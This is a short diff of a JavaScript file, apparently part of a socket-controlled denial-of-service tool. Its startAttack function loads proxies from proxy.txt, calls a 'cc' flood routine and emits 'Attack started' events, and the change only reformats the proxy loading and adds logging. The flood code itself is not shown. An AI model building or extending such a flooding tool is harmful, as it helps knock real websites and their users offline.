@@ -11,14 +11,18 @@ const startAttack = (url, time, socket) => {
 
   ParseUrl(url);
 
-  const proxies = fs.readFileSync(nodePath.join(__dirname, 'proxy.txt'), 'utf8').split('\n').filter(line => line.trim());
+  const proxies = fs.readFileSync(nodePath.join(__dirname, 'proxy.txt'), 'utf8')
+    .split('\n')
+    .filter(line => line.trim()); 
+
+  console.log("Loaded proxies:", proxies); 
 
   if (proxies.length === 0) {
     socket.emit('attackStopped', 'No proxies available');
     return;
   }
 
-  cc({ wait: () => {}, set: () => {} }, 5);
+  cc({ wait: () => {}, set: () => {} }, 5); 
 
   socket.emit('attackStarted', '🌸 Attack started successfully');
 
